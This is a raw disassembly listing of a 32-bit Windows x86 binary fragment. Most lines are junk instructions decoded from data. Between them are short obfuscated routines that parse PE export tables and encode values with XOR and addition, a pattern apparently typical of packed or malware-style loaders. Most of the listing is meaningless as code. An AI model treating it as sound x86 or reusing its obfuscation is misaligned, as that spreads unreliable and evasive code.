  408d1f:	outs   dx,DWORD PTR ds:[esi]
  408d20:	enter  0xc0b3,0x6f
  408d24:	(bad)  
  408d26:	ret    0x5885
  408d29:	pop    edx
  408d2a:	scas   al,BYTE PTR es:[edi]
  408d2b:	(bad)  
  408d2c:	outs   dx,DWORD PTR ds:[esi]
  408d2d:	push   esp
  408d2e:	add    esp,DWORD PTR [edi-0x4d]
  408d31:	gs clc 
  408d33:	out    dx,al
  408d34:	loope  0x408d61
  408d36:	int3   
  408d37:	(bad)  
  408d38:	dec    ecx
  408d39:	dec    esi
  408d3a:	mov    ah,0xdc
  408d3c:	sar    dh,1
  408d3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d3f:	dec    eax
  408d40:	test   BYTE PTR [ecx+0x6e],ah
  408d43:	shr    BYTE PTR [edx],cl
  408d45:	sub    dh,BYTE PTR [edx-0x48]
  408d48:	add    dh,al
  408d4a:	sahf   
  408d4b:	stos   DWORD PTR es:[edi],eax
  408d4c:	fst    QWORD PTR [ebx]
  408d4e:	(bad)  
  408d4f:	test   al,0xe7
  408d51:	(bad)  
  408d52:	cmc    
  408d53:	icebp  
  408d54:	jl     0x408d49
  408d56:	dec    edx
  408d57:	jne    0x408d72
  408d59:	aam    0x65
  408d5b:	and    al,0x1e
  408d5d:	xchg   BYTE PTR [esi+0x44395297],al
  408d63:	das    
  408d64:	test   al,0xe
  408d66:	xor    BYTE PTR [ebx+0x27],ch
  408d69:	mov    ecx,0xa7c989c2
  408d6e:	and    DWORD PTR [edi-0x57870fd],ebp
  408d74:	cmp    eax,0xfeff8d0d
  408d79:	shr    BYTE PTR [edi+ebp*2+0x441c24c8],0x61
  408d81:	inc    edx
  408d82:	xor    cl,BYTE PTR [ebx]
  408d84:	mov    edx,0xe000b6df
  408d89:	(bad)  [edx+0x5b200cf8]
  408d8f:	xlat   BYTE PTR gs:[ebx]
  408d91:	xchg   esi,eax
  408d92:	pop    edi
  408d93:	sbb    eax,0x72dca120
  408d98:	cwde   
  408d99:	repz xchg edx,eax
  408d9b:	cs push edi
  408d9d:	dec    eax
  408d9e:	jmp    0x39dcc6e7
  408da3:	jae    0x408e21
  408da5:	sbb    esi,ebp
  408da7:	ins    BYTE PTR es:[edi],dx
  408da8:	repnz pop esi
  408daa:	(bad)  
  408dab:	ja     0x408df5
  408dad:	mov    esi,0x75073262
  408db2:	repz add BYTE PTR [ebx-0x4c7d231b],0xec
  408dba:	add    dh,BYTE PTR [ebp+0x47]
  408dbd:	mov    cl,0xdc
  408dbf:	pop    edi
  408dc0:	xchg   esi,eax
  408dc1:	inc    ebx
  408dc2:	and    al,0x3f
  408dc4:	dec    ebp
  408dc5:	dec    esi
  408dc6:	inc    BYTE PTR [edx+eiz*8-0x5c]
  408dca:	pop    ss
  408dcb:	in     al,0x8d
  408dcd:	test   DWORD PTR [ecx+0x82ffaaa],esp
  408dd3:	fsub   QWORD PTR [edx+0x5ba15a7a]
  408dd9:	pop    esi
  408dda:	mov    gs,eax
  408ddc:	push   cs
  408ddd:	push   es
  408dde:	add    dh,al
  408de0:	sub    DWORD PTR [eax+esi*8+0x64],ebp
  408de4:	jle    0x408dc2
  408de6:	mov    ds:0x8f859021,al
  408deb:	mov    ds:0xe8b7101f,al
  408df0:	sbb    ebp,DWORD PTR [ebp+edx*8+0x1e]
  408df4:	xchg   edi,eax
  408df5:	sbb    eax,0x85caf75f
  408dfa:	(bad)  
  408dfb:	(bad)  
  408dfc:	adc    al,0x7d
  408dfe:	dec    ecx
  408dff:	ss dec esp
  408e01:	fstp   DWORD PTR [edx]
  408e03:	push   es
  408e04:	fs sti 
  408e06:	pusha  
  408e07:	dec    ebx
  408e08:	xchg   DWORD PTR [edx],ebp
  408e0a:	scas   al,BYTE PTR es:[edi]
  408e0b:	les    ebx,FWORD PTR [edi-0x486ef8d2]
  408e11:	imul   edx,DWORD PTR [esi-0x17],0xfffffff0
  408e15:	inc    edi
  408e16:	(bad)  
  408e17:	mov    esp,0xc1e01e7e
  408e1c:	call   FWORD PTR [edx-0x45628a46]
  408e22:	pushf  
  408e23:	xlat   BYTE PTR ds:[ebx]
  408e24:	sbb    DWORD PTR [esi+eiz*2+0xffc458b],ecx
  408e2b:	mov    bh,0xc0
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0xf1938b30
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	dec    ebp
  408ec5:	inc    esp
  408ec6:	shr    BYTE PTR [edi-0x16],1
  408ec9:	ret    0x57f2
  408ecc:	lods   al,BYTE PTR ds:[esi]
  408ecd:	retf   
  408ece:	call   0xd8b4:0x1d45c4ef
  408ed5:	sbb    DWORD PTR [edx+0x4c],esi
  408ed8:	(bad)  
  408ed9:	sbb    eax,0x8f4f5d54
  408ede:	scas   al,BYTE PTR es:[edi]
  408edf:	xchg   edi,eax
  408ee0:	xor    ch,BYTE PTR [ebp-0x2b63caef]
  408ee6:	cli    
  408ee7:	std    
  408ee8:	out    0x77,eax
  408eea:	cld    
  408eeb:	call   0x4aa03190
  408ef0:	xor    al,BYTE PTR [edi+0x57]
  408ef3:	cmp    DWORD PTR [esi+0x38],edx
  408ef6:	clc    
  408ef7:	out    0xb,eax
  408ef9:	sub    eax,0x29a394f0
  408efe:	jp     0x408f72
  408f00:	sbb    DWORD PTR [eax+0xeb0fd23],0xdc92d995
  408f0a:	or     eax,0x2b2f4609
  408f0f:	sbb    DWORD PTR [esi-0x2eeefbf5],ebx
  408f15:	pop    edi
  408f16:	pop    esi
  408f17:	retf   0xefea
  408f1a:	jl     0x408f92
  408f1c:	or     eax,0x70db8917
  408f21:	add    eax,0xd6f58bc1
  408f26:	mov    ah,0x82
  408f28:	test   DWORD PTR [eax+edx*2-0x54e724fa],ebx
  408f2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f30:	outs   dx,DWORD PTR ds:[esi]
  408f31:	adc    BYTE PTR [edx+ecx*4+0xcac430],0xc7
  408f39:	inc    ecx
  408f3a:	dec    ebp
  408f3b:	push   esp
  408f3c:	dec    edi
  408f3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f3e:	mov    ds:0xa4a0f162,al
  408f43:	jne    0x408f01
  408f45:	inc    ecx
  408f46:	stos   DWORD PTR es:[edi],eax
  408f47:	popf   
  408f48:	das    
  408f49:	sahf   
  408f4a:	pusha  
  408f4b:	lahf   
  408f4c:	mov    ecx,0x9bea6c43
  408f51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f52:	mov    ?,WORD PTR [edx]
  408f54:	jo     0x408fac
  408f56:	sub    eax,0x94848853
  408f5b:	pop    esp
  408f5c:	leave  
  408f5d:	aaa    
  408f5e:	or     BYTE PTR [ecx+0xdb31552],ah
  408f64:	enter  0x85d0,0x5a
  408f68:	cmp    eax,0xacbfd704
  408f6d:	aas    
  408f6e:	scas   al,BYTE PTR es:[edi]
  408f6f:	outs   dx,BYTE PTR ds:[esi]
  408f70:	push   es
  408f71:	pop    ss
  408f72:	std    
  408f73:	push   edx
  408f74:	cmp    al,0xd9
  408f76:	cmp    DWORD PTR [edx],0x74c703e7
  408f7c:	sub    esi,DWORD PTR [edi-0xc]
  408f7f:	dec    edx
  408f80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f81:	icebp  
  408f82:	and    al,BYTE PTR [ecx-0x44]
  408f85:	js     0x408f45
  408f87:	inc    eax
  408f88:	sub    eax,0x84318388
  408f8d:	dec    esp
  408f8e:	cmp    DWORD PTR cs:[ebp-0x3f],edx
  408f92:	pop    ecx
  408f93:	push   0x3c76f627
  408f98:	push   esp
  408f99:	sub    DWORD PTR [edx],esp
  408f9b:	xchg   edi,eax
  408f9c:	xor    ecx,ebp
  408f9e:	sub    BYTE PTR [edi],cl
  408fa0:	test   DWORD PTR [eax-0x7e],edi
  408fa3:	dec    si
  408fa5:	pop    ebx
  408fa6:	imul   edi,DWORD PTR [ebx],0xc1944951
  408fac:	jle    0x409002
  408fae:	adc    al,0x50
  408fb0:	or     dh,BYTE PTR [eax-0x27]
  408fb3:	cmp    BYTE PTR ds:0xfe3d310e,bh
  408fb9:	imul   ecx,DWORD PTR ds:0xe86e8d40,0x3539137b
  408fc3:	adc    al,0x4f
  408fc5:	add    DWORD PTR [esi+0x44],ebp
  408fc8:	mov    ss,WORD PTR [ebp-0x7c2e5418]
  408fce:	wbinvd 
  408fd0:	adc    ebp,edx
  408fd2:	scas   al,BYTE PTR es:[edi]
  408fd3:	ret    0xf0ab
  408fd6:	cmp    ah,BYTE PTR [ecx+eax*1+0x17]
  408fda:	mov    edi,0x8c5cd710
  408fdf:	retf   0x640
  408fe2:	shr    DWORD PTR [ecx+ebx*2],0xb2
  408fe6:	sbb    BYTE PTR [ecx],ch
  408fe8:	adc    eax,0x63c42896
  408fed:	inc    esp
  408fee:	and    BYTE PTR [eax-0x7d],0x1d
  408ff2:	ret    
  408ff3:	div    BYTE PTR [edx-0x8bf2cdf]
  408ff9:	push   esp
  408ffa:	aas    
  408ffb:	jno    0x408fec
  408ffd:	shr    esi,0x3
  409000:	dec    ecx
  409001:	pop    eax
  409002:	add    ch,BYTE PTR [eax+0x46]
  409005:	pop    ecx
  409006:	dec    ebp
  409007:	fisub  DWORD PTR [edx+0x36]
  40900a:	inc    esi
  40900b:	adc    DWORD PTR [esi-0x129a954],0x6f
  409012:	mov    edi,DWORD PTR [edx+ebx*1+0x79]
  409016:	es xchg ecx,eax
  409018:	push   0x37
  40901a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40901b:	ror    BYTE PTR [ebx+0x3a9f06ba],0x13
  409022:	cli    
  409023:	outs   dx,BYTE PTR cs:[esi]
  409025:	shl    al,0xdf
  409028:	sbb    ecx,DWORD PTR [edi+ecx*8+0x41fb77f6]
  40902f:	iret   
  409030:	sub    ecx,DWORD PTR [ecx]
  409032:	fisttp QWORD PTR [ebx+0xa571e3e]
  409038:	in     al,0xa3
  40903a:	fadd   DWORD PTR [eax+0x49a5149e]
  409040:	addr16 popa 
  409042:	inc    edx
  409043:	xchg   ebx,eax
  409044:	fmul   DWORD PTR [edi+ecx*8+0x264ed022]
  40904b:	mov    bl,0xd2
  40904d:	inc    eax
  40904e:	cdq    
  40904f:	push   es
  409050:	fwait
  409051:	mov    ds:0xcd3fe3b9,al
  409056:	ret    0x47fd
  409059:	mov    BYTE PTR [esi+0xd754278],dl
  40905f:	cli    
  409060:	jno    0x409087
  409062:	mov    edi,DWORD PTR [edx+ecx*8+0x50cae984]
  409069:	mov    esp,0x35b5ae77
  40906e:	push   cs
  40906f:	adc    dl,al
  409071:	jns    0x40909c
  409073:	xchg   BYTE PTR [edx],dl
  409075:	xor    cl,BYTE PTR [esi]
  409077:	addr16 lock popf 
  40907a:	ins    BYTE PTR es:[edi],dx
  40907b:	outs   dx,BYTE PTR ds:[esi]
  40907c:	push   esi
  40907d:	mov    esi,0x42e7e466
  409082:	jae    0x409010
  409084:	out    0x63,eax
  409086:	clc    
  409087:	push   es
  409088:	inc    edi
  409089:	mov    ?,WORD PTR ds:0xdad08399
  40908f:	lods   eax,DWORD PTR ds:[esi]
  409090:	push   eax
  409091:	dec    ebp
  409092:	cld    
  409093:	imul   ebp,ecx,0xffffff95
  409096:	icebp  
  409097:	mov    ebx,0x78cc1b50
  40909c:	add    al,0x27
  40909e:	sbb    al,0x1e
  4090a1:	add    DWORD PTR [eax-0x59e81fcc],edx
  4090a7:	mov    ebx,DWORD PTR [ebp-0x15]
  4090aa:	dec    eax
  4090ab:	mov    WORD PTR [ebp-0x66],ss
  4090ae:	pop    ds
  4090af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090b0:	or     bl,BYTE PTR [edx+ebp*8+0x19cc1589]
  4090b7:	in     eax,0xaa
  4090b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090ba:	aaa    
  4090bb:	sti    
  4090bc:	dec    edi
  4090bd:	cwde   
  4090be:	xchg   edi,eax
  4090bf:	or     edi,DWORD PTR [ebp+ebp*4+0x7e3558a]
  4090c6:	push   0xcf106b7
  4090cb:	div    DWORD PTR [ebx]
  4090cd:	aaa    
  4090ce:	adc    BYTE PTR [ebx],bl
  4090d0:	push   0x20c29e80
  4090d5:	xchg   edx,eax
  4090d6:	cmc    
  4090d7:	out    dx,eax
  4090d8:	and    ebx,DWORD PTR [edx-0x10342588]
  4090de:	mov    ecx,0xa4966d94
  4090e3:	call   DWORD PTR [ecx-0x43]
  4090e6:	mov    ebx,0x83d43d57
  4090eb:	xlat   BYTE PTR ds:[ebx]
  4090ec:	pop    ss
  4090ed:	pop    ds
  4090ee:	xor    eax,esi
  4090f0:	add    eax,edi
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0x94
  409163:	js     0x4091bc
  409165:	fidiv  DWORD PTR [edx]
  409167:	fistp  QWORD PTR [esi+0x7e]
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	addr16 xchg esp,eax
  409170:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409171:	ret    0xe5de
  409174:	or     BYTE PTR [esp+ebx*1+0x2f5fd6d3],bl
  40917b:	ins    DWORD PTR es:[edi],dx
  40917c:	shl    DWORD PTR [edi-0x7b112c82],cl
  409182:	shr    ah,0x61
  409185:	or     ebp,DWORD PTR [ebx]
  409187:	add    ecx,eax
  409189:	in     eax,0x9e
  40918b:	mov    ds:0xf04ce6d6,al
  409190:	push   edx
  409191:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409192:	in     al,0x81
  409194:	jnp    0x4091f2
  409196:	ja     0x409129
  409198:	jns    0x409162
  40919a:	rol    DWORD PTR [edi+0x46b0019c],0x5e
  4091a1:	rcr    DWORD PTR [edx],1
  4091a3:	fsub   DWORD PTR [edi]
  4091a5:	xor    al,0xfe
  4091a7:	ds xchg ebx,eax
  4091a9:	mov    ah,0x81
  4091ab:	loope  0x40918a
  4091ad:	push   ebx
  4091ae:	fst    DWORD PTR [edi]
  4091b0:	jge    0x409217
  4091b2:	lea    esp,[edx+0x6d691f59]
  4091b8:	xor    DWORD PTR [ecx-0x5efa85e5],eax
  4091be:	arpl   WORD PTR [edx],di
  4091c0:	and    eax,0x3ea445ba
  4091c5:	imul   ebp,DWORD PTR [ebx+0x6ad20b49],0x9896878d
  4091cf:	mov    ebp,0xc3a4802b
  4091d4:	sbb    BYTE PTR [ebp-0x1b3f2cfd],bl
  4091da:	out    dx,al
  4091db:	xor    BYTE PTR [ebp+0x23],ch
  4091de:	jns    0x40922a
  4091e0:	clc    
  4091e1:	das    
  4091e2:	ret    0x776
  4091e5:	xor    BYTE PTR [eax+0x697359ac],dl
  4091eb:	dec    edi
  4091ec:	ror    BYTE PTR [edx+eax*4-0x70e27cdc],cl
  4091f3:	call   FWORD PTR [edx-0x71466342]
  4091f9:	nop
  4091fa:	pop    esi
  4091fb:	aaa    
  4091fc:	into   
  4091fd:	iret   
  4091fe:	scas   al,BYTE PTR es:[edi]
  4091ff:	push   ebp
  409200:	lods   eax,DWORD PTR ds:[esi]
  409201:	stos   BYTE PTR es:[edi],al
  409202:	lahf   
  409203:	loopne 0x409213
  409205:	test   BYTE PTR [bp+si],al
  409208:	cmc    
  409209:	test   al,0xbe
  40920b:	push   esi
  40920c:	dec    edx
  40920d:	adc    al,BYTE PTR [edx]
  40920f:	and    ecx,edx
  409211:	fisttp WORD PTR [edx-0xf]
  409214:	stc    
  409215:	jae    0x4091df
  409217:	cli    
  409218:	add    eax,0xf2b97dfd
  40921d:	rcl    BYTE PTR [ebp+0xbad2832],cl
  409223:	loope  0x409297
  409225:	push   ebx
  409226:	fsubrp st(1),st
  409228:	or     BYTE PTR [esi],0x1e
  40922b:	add    ah,dl
  40922d:	cwde   
  40922e:	rol    ebx,cl
  409230:	add    al,0xf0
  409232:	jo     0x409227
  409234:	cld    
  409235:	cld    
  409236:	cmp    BYTE PTR [ebx+0x62],0x47
  40923a:	mov    BYTE PTR [ebx+edi*4],ch
  40923d:	adc    bl,BYTE PTR [ebx-0x38]
  409240:	mov    ch,0x66
  409242:	loop   0x40921d
  409244:	add    al,ah
  409246:	aaa    
  409247:	cmp    esi,DWORD PTR [eax]
  409249:	icebp  
  40924a:	xor    DWORD PTR [esi-0x21840096],ebx
  409250:	ret    0xd4bc
  409253:	ds jno 0x409281
  409256:	or     eax,0x28c78f0a
  40925b:	test   BYTE PTR [edx-0x4d1748d7],0x4c
  409262:	sub    DWORD PTR [ebx+0x31aa66b7],0xb181484b
  40926c:	fsubr  st(4),st
  40926e:	push   0x883fd2d7
  409273:	adc    al,0x73
  409275:	dec    esp
  409276:	out    dx,al
  409277:	cli    
  409278:	pop    eax
  409279:	jle    0x409254
  40927b:	inc    ebp
  40927c:	push   edi
  40927d:	scas   al,BYTE PTR es:[edi]
  40927e:	scas   eax,DWORD PTR es:[edi]
  40927f:	sub    eax,DWORD PTR [eax]
  409281:	ret    0x4f86
  409284:	(bad)  
  409285:	ret    
  409286:	cmp    BYTE PTR [edi-0x915fc3e],bh
  40928c:	xchg   ebx,eax
  40928d:	and    eax,0xfad7472e
  409292:	lea    edx,[esi-0x1612a30f]
  409298:	add    BYTE PTR [edi+0x6ef30080],bh
  40929e:	dec    ebp
  40929f:	xor    al,0xec
  4092a1:	inc    esp
  4092a2:	mov    ch,BYTE PTR [ebp+0x28a1e27b]
  4092a8:	shl    BYTE PTR gs:[ecx-0x1e],cl
  4092ac:	dec    esp
  4092ad:	or     esp,edx
  4092af:	mov    ch,BYTE PTR [esi]
  4092b1:	(bad)  [edx+ecx*8]
  4092b4:	icebp  
  4092b5:	mov    esp,DWORD PTR [edx]
  4092b7:	inc    esp
  4092b8:	pop    ds
  4092b9:	dec    eax
  4092ba:	pmullw mm5,mm5
  4092bd:	sbb    DWORD PTR [ecx+0x2e493715],0xb
  4092c4:	mov    edx,0xc2c08c9d
  4092c9:	fdivr  QWORD PTR [edi]
  4092cb:	mov    dl,0x40
  4092cd:	retf   0xc5d8
  4092d0:	cld    
  4092d1:	fsubrp st(5),st
  4092d3:	cmp    BYTE PTR [edx-0x6e],bh
  4092d6:	dec    ebx
  4092d7:	cmp    eax,0x65d12211
  4092dc:	inc    ebx
  4092dd:	inc    ebp
  4092de:	ins    DWORD PTR es:[edi],dx
  4092df:	pusha  
  4092e0:	imul   ecx,DWORD PTR [ecx+0x2e67259a],0x8d0fe61f
  4092ea:	mov    ah,0xdf
  4092ec:	xchg   ebx,eax
  4092ed:	jae    0x409277
  4092ef:	dec    eax
  4092f0:	rol    BYTE PTR [edx],1
  4092f2:	test   eax,0xbb1257d9
  4092f7:	enter  0xe398,0xbb
  4092fb:	aad    0xcf
  4092fd:	push   cs
  4092fe:	sub    BYTE PTR [edx-0x525240cd],bl
  409304:	and    al,0x47
  409306:	test   ebp,esp
  409308:	push   0xf0cb5277
  40930d:	test   al,0x5b
  40930f:	mov    edi,0x14e33c0f
  409314:	jmpw   0x6886
  409318:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409319:	push   0x8beb43ff
  40931e:	mov    eax,ds:0x6802e3d4
  409323:	div    cl
  409325:	or     al,0x16
  409327:	ins    BYTE PTR es:[edi],dx
  409328:	cmp    al,0x2b
  40932a:	jo     0x409349
  40932c:	call   0xf5482053
  409331:	(bad)  
  409333:	imul   ebx,DWORD PTR [edi],0x840a91ec
  409339:	xchg   bh,ch
  40933b:	cmp    DWORD PTR [edx],0x5
  40933e:	push   ss
  40933f:	popa   
  409340:	(bad)  
  409341:	out    dx,eax
  409342:	addr16 stc 
  409344:	stc    
  409345:	sub    DWORD PTR [esp+ebx*8-0x38a40e95],edx
  40934c:	outs   dx,DWORD PTR ds:[esi]
  40934d:	dec    edi
  40934e:	in     eax,dx
  40934f:	stos   DWORD PTR es:[edi],eax
  409350:	push   0xffffffc4
  409352:	sahf   
  409353:	outs   dx,BYTE PTR ds:[esi]
  409354:	mov    ds:0xe633bb8e,al
  409359:	jo     0x40938a
  40935b:	pop    esp
  40935c:	fisub  WORD PTR [edx+ecx*1]
  40935f:	lea    ebp,[esi]
  409361:	mov    ebx,0xdaa30300
  409366:	fistp  WORD PTR [edx-0x137bee78]
  40936c:	(bad)  
  40936d:	aam    0x17
  40936f:	sub    BYTE PTR [edx+0x3d],ch
  409372:	lods   eax,DWORD PTR ds:[esi]
  409373:	fs mov dh,0x80
  409376:	rcr    DWORD PTR [ebx-0xa],cl
  409379:	sub    BYTE PTR [edi],0x73
  40937c:	rcr    DWORD PTR [edi+0x75],0x80
  409380:	addr16 aam 0xb1
  409383:	mov    al,ds:0x36937a2d
  409388:	and    esp,ebp
  40938a:	and    al,0x98
  40938c:	cmp    eax,DWORD PTR [ecx+0x21ec348f]
  409392:	arpl   WORD PTR [eax-0x53cfe08e],dx
  409398:	mov    DWORD PTR [eax],ecx
  40939a:	mov    eax,DWORD PTR [ebp+0xc]
  40939d:	mov    eax,DWORD PTR [ebp+0x8]
  4093a0:	push   DWORD PTR [ebp-0x8]
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	mov    esi,0xd8387b68
  4093b9:	fnstsw WORD PTR [esi+0x7e]
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	clc    
  4093c1:	or     eax,0xa96ec75e
  4093c6:	add    al,BYTE PTR [edi-0x31]
  4093c9:	retf   0xa91d
  4093cc:	mov    esi,0xefe8632d
  4093d1:	aaa    
  4093d2:	retf   
  4093d3:	push   ebp
  4093d4:	xor    BYTE PTR ds:0xe9e3d3e1,cl
  4093da:	mov    cl,0x77
  4093dc:	ins    BYTE PTR es:[edi],dx
  4093dd:	das    
  4093de:	sti    
  4093df:	and    eax,0xd85330d0
  4093e4:	cdq    
  4093e5:	dec    ecx
  4093e6:	daa    
  4093e7:	dec    edi
  4093e8:	sub    eax,0x8fbd1ee9
  4093ed:	dec    ecx
  4093ee:	je     0x409465
  4093f0:	dec    ecx
  4093f1:	pusha  
  4093f2:	ss sti 
  4093f4:	xor    eax,0xfa60a016
  4093f9:	fcom   QWORD PTR [edx-0x3c]
  4093fc:	inc    ebx
  4093fd:	mov    DWORD PTR ds:0xeebfa9bd,ebp
  409403:	(bad)  
  409404:	data16 mov al,al
  409407:	pop    esi
  409408:	out    0x43,eax
  40940a:	inc    edx
  40940b:	cld    
  40940c:	xchg   ebx,eax
  40940d:	retf   0x6acf
  409410:	fistp  WORD PTR [ecx]
  409412:	enter  0x42ee,0xd
  409416:	dec    eax
  409417:	arpl   WORD PTR [edx+edi*2+0x76495c5f],di
  40941e:	lea    esp,[edx]
  409420:	and    dl,ah
  409422:	jno    0x409423
  409424:	loopne 0x40944f
  409426:	pop    edi
  409427:	jp     0x40948d
  409429:	mov    edx,0x2f2f00de
  40942e:	add    bl,dh
  409430:	(bad)  [eax]
  409432:	loopne 0x4093f1
  409434:	sub    eax,eax
  409436:	stos   DWORD PTR es:[edi],eax
  409437:	std    
  409438:	je     0x409444
  40943a:	fisub  DWORD PTR [edi+0x40f957f2]
  409440:	ret    
  409441:	jno    0x409493
  409443:	in     eax,dx
  409444:	inc    BYTE PTR [esi+0x3d]
  409447:	or     al,0x99
  409449:	inc    edx
  40944a:	test   DWORD PTR [ebx-0x80],ecx
  40944d:	cli    
  40944e:	add    dh,cl
  409450:	cmp    ebx,DWORD PTR [ecx-0x1a8544e7]
  409456:	in     al,dx
  409457:	xor    BYTE PTR [ecx],dh
  409459:	dec    edx
  40945a:	mov    edi,0x50780eb2
  40945f:	push   ss
  409460:	rcl    dl,1
  409462:	or     dl,ch
  409464:	std    
  409465:	sahf   
  409466:	fwait
  409467:	dec    esp
  409468:	xlat   BYTE PTR ds:[ebx]
  409469:	icebp  
  40946a:	or     DWORD PTR [ecx+0x54],edi
  40946d:	bound  edi,QWORD PTR [esi+edx*2]
  409470:	gs xor al,0xcd
  409473:	(bad)  
  409475:	stos   BYTE PTR es:[edi],al
  409476:	je     0x409411
  409478:	add    BYTE PTR [ebx-0x1a2e17c6],dh
  40947e:	repz fnstenv [edi-0x780ca1fc]
  409485:	rcr    ebx,1
  409487:	nop
  409488:	xor    DWORD PTR [edi+0x46197771],0xf752456d
  409492:	inc    edx
  409493:	mov    edi,0xa33b6d00
  409498:	jmp    0xb959:0xb0703beb
  40949f:	mov    ds:0xb0393edf,al
  4094a4:	into   
  4094a5:	jns    0x4094d3
  4094a7:	es ja  0x4094fa
  4094aa:	sti    
  4094ab:	nop
  4094ac:	sub    BYTE PTR [eax+0xb009bbe],cl
  4094b2:	lahf   
  4094b3:	out    0xe7,eax
  4094b5:	loop   0x4094a2
  4094b7:	push   esp
  4094b8:	lock xor al,0x48
  4094bb:	test   eax,0x4e48e03d
  4094c0:	pop    ecx
  4094c1:	xor    ebp,DWORD PTR [edi]
  4094c3:	or     al,0xf3
  4094c5:	popf   
  4094c6:	xor    ebx,ecx
  4094c8:	xchg   BYTE PTR [ebx+eiz*4+0x7a82edfe],bl
  4094cf:	xlat   BYTE PTR ds:[ebx]
  4094d0:	dec    edx
  4094d1:	test   bh,ah
  4094d3:	or     al,0x10
  4094d5:	aas    
  4094d6:	imul   ebp,DWORD PTR [edi+ecx*4+0x21],0x61
  4094db:	mov    edi,0xf41d1b15
  4094e0:	jp     0x409508
  4094e2:	pusha  
  4094e3:	aaa    
  4094e4:	test   DWORD PTR [ebp+edx*8+0x70184e79],eax
  4094eb:	ror    DWORD PTR [edi],cl
  4094ed:	and    DWORD PTR [eax],edx
  4094ef:	pop    esi
  4094f0:	pop    ebp
  4094f1:	xor    DWORD PTR [ecx-0x7e4bbd66],edi
  4094f7:	enter  0xf8e7,0xeb
  4094fb:	push   0xfffffff3
  4094fd:	xchg   edi,eax
  4094fe:	or     dh,cl
  409500:	cld    
  409501:	imul   ebx,DWORD PTR [ebx+edi*4-0x27],0x5d10e650
  409509:	in     eax,0x17
  40950b:	outs   dx,BYTE PTR ds:[esi]
  40950c:	mov    dh,0x8
